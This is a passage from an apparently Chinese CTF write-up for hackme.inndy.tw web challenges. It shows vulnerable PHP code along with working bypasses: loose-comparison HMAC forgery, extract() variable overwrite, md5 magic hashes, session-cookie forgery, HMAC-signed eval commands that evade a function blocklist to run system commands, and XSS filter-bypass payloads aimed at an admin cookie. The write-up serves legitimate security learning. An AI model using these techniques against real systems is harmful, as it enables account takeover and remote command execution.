<p>Get another flag<br>Tips: boolean-based SQL injection, <code>information_schema</code></p>
</blockquote>
<p>开始写脚本盲注，网络太慢了，以后搞。</p>
<h2 id="login-as-admin-3"><a href="#login-as-admin-3" class="headerlink" title="login as admin 3"></a><a href="https://hackme.inndy.tw/login3" target="_blank" rel="noopener">login as admin 3</a></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'users_db.php'</span>); <span class="comment">// $users</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_user</span><span class="params">($user_data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $user, $secret;</span><br><span class="line"></span><br><span class="line">    $user = [$user_data[<span class="string">'name'</span>], $user_data[<span class="string">'admin'</span>]];</span><br><span class="line"></span><br><span class="line">    $data = json_encode($user);</span><br><span class="line">    $sig = hash_hmac(<span class="string">'sha512'</span>, $data, $secret);</span><br><span class="line">    $all = base64_encode(json_encode([<span class="string">'sig'</span> =&gt; $sig, <span class="string">'data'</span> =&gt; $data]));</span><br><span class="line">    setcookie(<span class="string">'user'</span>, $all, time()+<span class="number">3600</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$error = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">load_user</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $secret, $error;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE[<span class="string">'user'</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $unserialized = json_decode(base64_decode($_COOKIE[<span class="string">'user'</span>]), <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// == 可能绕过</span></span><br><span class="line">    <span class="keyword">if</span>(hash_hmac(<span class="string">'sha512'</span>, $unserialized[<span class="string">'data'</span>], $secret) != $unserialized[<span class="string">'sig'</span>]) &#123;</span><br><span class="line">        $error = <span class="string">'Invalid session'</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $data = json_decode($unserialized[<span class="string">'data'</span>], <span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">'name'</span> =&gt; $data[<span class="number">0</span>],</span><br><span class="line">        <span class="string">'admin'</span> =&gt; $data[<span class="number">1</span>]</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user = load_user();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'name'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $user = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">foreach</span>($users <span class="keyword">as</span> $u) &#123;</span><br><span class="line">        <span class="keyword">if</span>($u[<span class="string">'name'</span>] === $_POST[<span class="string">'name'</span>] &amp;&amp; $u[<span class="string">'password'</span>] === $_POST[<span class="string">'password'</span>]) &#123;</span><br><span class="line">            set_user($u);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先用 <code>guest</code> 登录玩玩，<code>cookie</code> 中多了一个 <code>user</code> 的值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJzaWciOiI3NWQ1M2Y5N2FjZDIxMTA5OGEwNTJiMzA1ZDFjYWYxOTE0MzZjNmQyOWQxOTM2ZDk0N2Y4ZmRlNzczMzAwOGEzOTY4ZWRhYTRiNGE2ODI0MmRiODY5NjAzMDUwNTI3MzkxNGRlZDY4OGQ0NTllOGM5MjI1MjAwZDcyOWEwYjk4ZSIsImRhdGEiOiJbXCJndWVzdFwiLGZhbHNlXSJ9</span><br><span class="line"></span><br><span class="line">base64_decode =&gt;</span><br><span class="line">&#123;&quot;sig&quot;:&quot;75d53f97acd211098a052b305d1caf191436c6d29d1936d947f8fde7733008a3968edaa4b4a68242db8696030505273914ded688d459e8c9225200d729a0b98e&quot;,&quot;data&quot;:&quot;[\&quot;guest\&quot;,false]&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><code>hmac</code> 验证 <code>data</code> 是否被篡改，可惜用的是 <code>!=</code> ，将自动进行类型转换，我们将 <code>sig</code> 的值设为 0 即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;sig&quot;:0,&quot;data&quot;:&quot;[\&quot;1\&quot;,1]&quot;&#125;  // 第二个值为 true 即可</span><br><span class="line"></span><br><span class="line">base64_encode =&gt;</span><br><span class="line">eyJzaWciOjAsImRhdGEiOiJbXCIxXCIsMV0ifQ==</span><br><span class="line"></span><br><span class="line">需要注意的是，这里 data 里的值也不能完全瞎弄，hash 结果如果以数字开头，则过不了，以字母开头才能过 if</span><br></pre></td></tr></table></figure>

<h2 id="login-as-admin-4"><a href="#login-as-admin-4" class="headerlink" title="login as admin 4"></a><a href="https://hackme.inndy.tw/login4" target="_blank" rel="noopener">login as admin 4</a></h2><p>这一块有逻辑问题。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>($_POST[<span class="string">'name'</span>] === <span class="string">'admin'</span>): <span class="comment">/* login success! */</span> <span class="meta">?&gt;</span></span><br><span class="line">      &lt;div class="alert alert-success"&gt;&lt;code&gt;&lt;?=$flag?&gt;&lt;/code&gt;&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="login-as-admin-6"><a href="#login-as-admin-6" class="headerlink" title="login as admin 6"></a><a href="https://hackme.inndy.tw/login6" target="_blank" rel="noopener">login as admin 6</a></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(E_ALL^E_NOTICE);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'data'</span>])) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $data = json_decode($_POST[<span class="string">'data'</span>], <span class="keyword">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        $data = [];</span><br><span class="line">    &#125;</span><br><span class="line">    extract($data);</span><br><span class="line">    <span class="comment">// 变量覆盖</span></span><br><span class="line">    <span class="keyword">if</span>($users[$username] &amp;&amp; strcmp($users[$username], $password) == <span class="number">0</span>) &#123;</span><br><span class="line">        $user = $username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(!$user &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'data'</span>])): <span class="meta">?&gt;</span></span><br><span class="line">            &lt;div class="alert alert-danger"&gt;Login failed&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span></span><br><span class="line">            &lt;h3&gt;Hi, <span class="meta">&lt;?</span>=htmlentities($username)<span class="meta">?&gt;</span>&lt;/h3&gt;</span><br><span class="line">            &lt;h4&gt;<span class="meta">&lt;?</span>=sprintf(<span class="string">"You %s admin!"</span>, $user == <span class="string">'admin'</span> ? <span class="string">"are"</span> : <span class="string">"are not"</span>)<span class="meta">?&gt;</span>&lt;/h4&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span> <span class="keyword">if</span>($user == <span class="string">'admin'</span>) printf(<span class="string">"&lt;code&gt;%s&lt;/code&gt;"</span>, htmlentities($flag)); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看到 <code>extract</code> 基本上就是变量覆盖的洞了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data=&#123;&quot;user&quot;:&quot;admin&quot;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="login-as-admin-7"><a href="#login-as-admin-7" class="headerlink" title="login as admin 7"></a><a href="https://hackme.inndy.tw/login7" target="_blank" rel="noopener">login as admin 7</a></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'name'</span>] == <span class="string">'admin'</span> &amp;&amp; md5($_POST[<span class="string">'password'</span>]) == <span class="string">'00000000000000000000000000000000'</span>)&#123;</span><br><span class="line">    <span class="comment">// admin account is disabled by give a impossible md5 hash</span></span><br><span class="line">    $user = <span class="string">'admin'</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span>($_POST[<span class="string">'name'</span>] == <span class="string">'guest'</span> &amp;&amp; md5($_POST[<span class="string">'password'</span>]) == <span class="string">'084e0343a0486ff05530df6c705c8bb4'</span>) &#123;</span><br><span class="line">    $user = <span class="string">'guest'</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="keyword">isset</span>($_POST[<span class="string">'name'</span>])) &#123;</span><br><span class="line">    $user = <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>弱类型比较 + 魔法哈希</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(<span class="string">'0e0'</span> == <span class="string">'0000'</span>);  <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s1184209335a</span><br><span class="line"><span class="number">0e072485820392773389523109082030</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e73119806149116307319712</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s532378020a</span><br><span class="line"><span class="number">0e220463095855511507588041205815</span></span><br></pre></td></tr></table></figure>

<h2 id="login-as-admin-8"><a href="#login-as-admin-8" class="headerlink" title="login as admin 8"></a><a href="https://hackme.inndy.tw/login8" target="_blank" rel="noopener">login as admin 8</a></h2><p>给出的核心代码就这些，剩下的要靠自己慢慢找了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">'session.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// class Session &#123; ... &#125;</span></span><br><span class="line"><span class="comment">// sorry, no source code this time. :P</span></span><br><span class="line"></span><br><span class="line">$session = Session::load();</span><br><span class="line">$login_failed = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'debug'</span>] === <span class="string">'1'</span>) &#123;</span><br><span class="line">    $session-&gt;debug();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'name'</span>])) &#123;</span><br><span class="line">    $login_failed = !Session::login($_POST[<span class="string">'name'</span>], $_POST[<span class="string">'password'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'logout'</span>])) &#123;</span><br><span class="line">    $session = <span class="keyword">new</span> Session();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$session-&gt;save();</span><br></pre></td></tr></table></figure>

<p><code>cookie</code> 里有点东西，<strong>login8cookie</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O%3A7%3A%22Session%22%3A6%3A%7Bs%3A14%3A%22%00Session%00debug%22%3Bb%3A0%3Bs%3A19%3A%22%00Session%00debug_dump%22%3Bs%3A9%3A%22index.php%22%3Bs%3A13%3A%22%00Session%00data%22%3Ba%3A0%3A%7B%7Ds%3A4%3A%22user%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22pass%22%3Bs%3A0%3A%22%22%3Bs%3A8%3A%22is_admin%22%3Bb%3A0%3B%7D</span><br></pre></td></tr></table></figure>

<p><strong>login8sha512</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4feb33685e47c83ce089b1707f270001a8dc0648d4a7d94d0a3e2f5b35803a7c8766285283415c8594e658468cf5e99be232b3bf98a441568a71f709243e9077</span><br></pre></td></tr></table></figure>

<p>发现，<code>sha512</code> 的值直接是 <code>cookie</code> 的杂凑值，没有加密，没有加盐，同时改就 OK 了。</p>
<p>需要注意的是，不能 URL 解码后直接复制去 hash，这样会丢失一些不可见字符 <code>%00</code>。</p>
<h2 id="login-as-admin-8-1"><a href="#login-as-admin-8-1" class="headerlink" title="login as admin 8.1"></a><a href="https://hackme.inndy.tw/login8" target="_blank" rel="noopener">login as admin 8.1</a></h2><blockquote>
<p>login as admin and grab the hidden flag</p>
</blockquote>
<p>注意到上面的 <code>cookie</code> 中还有 <code>debug</code> 选项。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib, urllib.parse</span><br><span class="line">en = <span class="string">"""O%3A7%3A%22Session%22%3A6%3A%7Bs%3A14%3A%22%00Session%00debug%22%3Bb%3A1%3Bs%3A19%3A%22%00Session%00debug_dump%22%3Bs%3A10%3A%22config.php%22%3Bs%3A13%3A%22%00Session%00data%22%3Ba%3A0%3A%7B%7Ds%3A4%3A%22user%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22pass%22%3Bs%3A0%3A%22%22%3Bs%3A8%3A%22is_admin%22%3Bb%3A1%3B%7D"""</span></span><br><span class="line">print(hashlib.sha512((urllib.parse.unquote(en)).encode()).hexdigest())</span><br></pre></td></tr></table></figure>

<p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2lo6mueh3j20jv08nglt.jpg" alt></p>
<h2 id="dafuq-manager-1"><a href="#dafuq-manager-1" class="headerlink" title="dafuq-manager 1"></a><a href="https://dafuq-manager.hackme.inndy.tw/" target="_blank" rel="noopener">dafuq-manager 1</a></h2><blockquote>
<p>Login as guest and find flag 1</p>
</blockquote>
<p><code>guest</code> 登录看看，发现是一个文件管理系统，还给了源码。</p>
<p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2lodixl9mj20vf0hn0v5.jpg" alt></p>
<h2 id="dafuq-manager-2"><a href="#dafuq-manager-2" class="headerlink" title="dafuq-manager 2"></a><a href="https://dafuq-manager.hackme.inndy.tw/" target="_blank" rel="noopener">dafuq-manager 2</a></h2><blockquote>
<p>Try to login as admin! and you will get flag2</p>
</blockquote>
<p>先简单的审计一番，发现并没用到数据库，用户信息是用文件存储的。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$GLOBALS[<span class="string">"users"</span>] = <span class="keyword">array</span>(</span><br><span class="line">    <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">"guest"</span>, </span><br><span class="line">        <span class="string">"084e0343a0486ff05530df6c705c8bb4"</span>, </span><br><span class="line">        <span class="string">"./data/guest"</span>, </span><br><span class="line">        <span class="string">"https://game1.security.ntu.st/data/guest"</span>, </span><br><span class="line">        <span class="number">0</span>, </span><br><span class="line">        <span class="string">"^.ht"</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span></span><br><span class="line">    ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>没数据库就不需要考虑 <code>sqli</code> 了，直接想办法读文件。</p>
<p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2m7vaxjiqj20sl07t75a.jpg" alt></p>
<p>敏感函数大致在这，一个一个看下。</p>
<p><strong>fun_down.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 判断文件是否存在</span></span><br><span class="line"><span class="keyword">if</span> (!get_is_file($dir, $item)) </span><br><span class="line">    show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"fileexist"</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!get_show_item($dir, $item)) </span><br><span class="line">    show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line"><span class="comment">// 跟进 get_show_item</span></span><br><span class="line"><span class="keyword">if</span> ($item == <span class="string">"."</span> || $item == <span class="string">".."</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"><span class="comment">// 这个判断太弱了，不用管</span></span><br><span class="line"><span class="keyword">if</span> ($GLOBALS[<span class="string">"show_hidden"</span>] == <span class="keyword">false</span>) &#123;  <span class="comment">// show_hidden=1</span></span><br><span class="line">    $dirs = explode(<span class="string">"/"</span>, $dir);</span><br><span class="line">    <span class="keyword">foreach</span> ($dirs <span class="keyword">as</span> $i) <span class="keyword">if</span> (substr($i, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">"."</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 形成完整路径</span></span><br><span class="line">$abs_item = get_abs_item($dir, $item);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里判断了是否有 .php / config，不太好过，再去看看其他点</span></span><br><span class="line"><span class="keyword">if</span> (!file_in_web($abs_item) || stristr($abs_item, <span class="string">'.php'</span>) || stristr($abs_item, <span class="string">'config'</span>)) </span><br><span class="line">    show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br></pre></td></tr></table></figure>

<p><strong>fun_edit.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 这里没了之前那个刺头</span></span><br><span class="line"><span class="keyword">if</span> (!get_is_file($dir, $item)) </span><br><span class="line">    show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"fileexist"</span>]);</span><br><span class="line"><span class="keyword">if</span> (!get_show_item($dir, $item)) </span><br><span class="line">    show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line"></span><br><span class="line">$fname = get_abs_item($dir, $item);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!file_in_web($fname)) </span><br><span class="line">    show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br></pre></td></tr></table></figure>

<p>可以先尝试读取 <code>index.php</code> ，确定好相对路径后再读这个配置文件。</p>
<p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2m8dzr3brj20yo0j3djb.jpg" alt></p>
<p>用管理员账号登录即可看到 flag。</p>
<h2 id="dafuq-manager-3"><a href="#dafuq-manager-3" class="headerlink" title="dafuq-manager 3"></a><a href="https://dafuq-manager.hackme.inndy.tw/" target="_blank" rel="noopener">dafuq-manager 3</a></h2><blockquote>
<p>For flag3, you need a shell to get that. see $WEBROOT/flag3!</p>
</blockquote>
<p>之前看源码的时候，留意到一个 <code>debug</code> 的地方，而且也扫出来了 <code>eval</code>。</p>
<p>定位到 <code>fun_debug.php</code> ，也可以尝试下传个 <code>webshell</code>上去。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_debug</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    assert(strlen($GLOBALS[<span class="string">'secret_key'</span>]) &gt; <span class="number">40</span>);</span><br><span class="line">    $dir = $GLOBALS[<span class="string">'__GET'</span>][<span class="string">'dir'</span>];</span><br><span class="line">    <span class="comment">// 传个数组过了</span></span><br><span class="line">    <span class="keyword">if</span> (strcmp($dir, <span class="string">"magically"</span>) || strcmp($dir, <span class="string">"hacker"</span>) || strcmp($dir, <span class="string">"admin"</span>)) &#123;</span><br><span class="line">        show_error(<span class="string">'You are not hacky enough :('</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">list</span>($cmd, $hmac) = explode(<span class="string">'.'</span>, $GLOBALS[<span class="string">'__GET'</span>][<span class="string">'command'</span>], <span class="number">2</span>);</span><br><span class="line">    $cmd = base64_decode($cmd);</span><br><span class="line">    $bad_things = <span class="keyword">array</span>(<span class="string">'system'</span>, <span class="string">'exec'</span>, <span class="string">'popen'</span>, <span class="string">'pcntl_exec'</span>, <span class="string">'proc_open'</span>, <span class="string">'passthru'</span>, <span class="string">'`'</span>, <span class="string">'eval'</span>, <span class="string">'assert'</span>, <span class="string">'preg_replace'</span>, <span class="string">'create_function'</span>, <span class="string">'include'</span>, <span class="string">'require'</span>, <span class="string">'curl'</span>,);</span><br><span class="line">    <span class="keyword">foreach</span> ($bad_things <span class="keyword">as</span> $bad) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr($cmd, $bad)) &#123;  <span class="comment">// 过滤太弱了</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'2bad'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (hash_equals(hash_hmac(<span class="string">'sha256'</span>, $cmd, $GLOBALS[<span class="string">"secret_key"</span>]), $hmac)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="keyword">eval</span>($cmd));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        show_error(<span class="string">'What does the fox say?'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后就是命令注入的套路了，咱们弹个 <code>shell</code> 玩玩。 <a href="https://www.anquanke.com/post/id/168667" target="_blank" rel="noopener">如何远程利用PHP绕过Filter以及WAF规则</a></p>
<p>弹了半天没弹出来，估计做了什么设置，还是老老实实读文件吧。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_command</span><span class="params">($cmd)</span> </span>&#123;</span><br><span class="line">    $hmac = hash_hmac(<span class="string">'sha256'</span>, $cmd, <span class="string">'KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3'</span>);</span><br><span class="line">    <span class="keyword">return</span> sprintf(<span class="string">'%s.%s'</span>, base64_encode($cmd), $hmac);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> make_command(<span class="string">'$a=\'syste\';$b=\'m\';$a.=$b;$a(\'ls -al\');'</span>);</span><br></pre></td></tr></table></figure>

<p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2mbaypcbqj20yo0cdtav.jpg" alt></p>
<p>发现 <code>flag3</code> 这个目录，看看里面有啥东西。</p>
<p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2mbd1c4sdj20qs09tgn9.jpg" alt></p>
<p> <code>root</code> 才能读 <code>flag3</code> ，有点提权的味道了。先看看 <code>meow.c</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *exec = argv[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *flag = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"Usage: %s flag\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    	<span class="built_in">puts</span>(<span class="string">"We have cat to read file, And the meow to cat flag."</span>);</span><br><span class="line">    	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">S</span>;</span></span><br><span class="line">    <span class="keyword">if</span>(stat(exec, &amp;S) != <span class="number">0</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"Can not stat file %s\n"</span>, exec);</span><br><span class="line">    	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uid_t</span> uid = S.st_uid;</span><br><span class="line">    <span class="keyword">gid_t</span> gid = S.st_gid;</span><br><span class="line"></span><br><span class="line">    setuid(uid);</span><br><span class="line">    seteuid(uid);</span><br><span class="line">    setgid(gid);</span><br><span class="line">    setegid(gid);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(flag, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"Can not open file %s\n"</span>, flag);</span><br><span class="line">    	<span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">ssize_t</span> readed = read(fd, buffer, <span class="keyword">sizeof</span>(buffer) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(readed &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    	write(<span class="number">1</span>, buffer, readed);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那就用这个程序读 <code>flag</code> 吧。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> make_command(<span class="string">'$a=\'syste\';$b=\'m\';$a.=$b;$a(\'./flag3/meow ./flag3/flag3\');'</span>);</span><br></pre></td></tr></table></figure>

<h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a><a href="https://webshell.hackme.inndy.tw/" target="_blank" rel="noopener">webshell</a></h2><p>这题挂掉了，修复了再做。</p>
<h2 id="command-executor"><a href="#command-executor" class="headerlink" title="command-executor"></a><a href="https://command-executor.hackme.inndy.tw/" target="_blank" rel="noopener">command-executor</a></h2><p>单独写 wp</p>
<h2 id="xssme"><a href="#xssme" class="headerlink" title="xssme"></a><a href="https://xssrf.hackme.inndy.tw/" target="_blank" rel="noopener">xssme</a></h2><blockquote>
<p>XSS admin to steal flag</p>
</blockquote>
<p>都强调了 <code>xss</code> ，那就是打管理员 <code>cookie</code> 了。</p>
<p>不过还是扫一遍目录看看，以防丢失重要信息。</p>
<p><img src="https://ws1.sinaimg.cn/large/de75fd55gy1g2w1ga3d3gj20a904bwew.jpg" alt></p>
<p>一登录进来就发现是个邮箱管理界面，而且<code>admin</code> 已经发了封欢迎邮件过来。</p>
<p>接下来就是给 <code>admin</code> 发封邮件，插入咱们的 <code>js</code> payload，把 <code>cookie</code> 偷过来。 </p>
<p>这里有个很有趣的点，可以自己给自己发邮件，这样就完全不用怀疑 <code>bot</code> 会出故障，自己打自己成功了再去打管理员是一个更好的选择。</p>
<p>题目很友好，直接提示了哪些字符不能用，而且显示了管理员是否阅读了该邮件。</p>
<p>简单尝试了一下，以下字符被过滤：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script</span><br><span class="line">)</span><br><span class="line">onmouseover</span><br><span class="line">空格onload</span><br><span class="line">空格onerror</span><br><span class="line">&lt;iframe</span><br></pre></td></tr></table></figure>

<p>但还有个常用的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;svg onload=alert(1);&gt;</span><br><span class="line">&lt;svg/onload=alert(1)&gt;</span><br><span class="line">&lt;svg/onload=prompt(1)</span><br><span class="line">&lt;svg/onload=&quot;javascript:alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>构造 <code>payload</code></p>
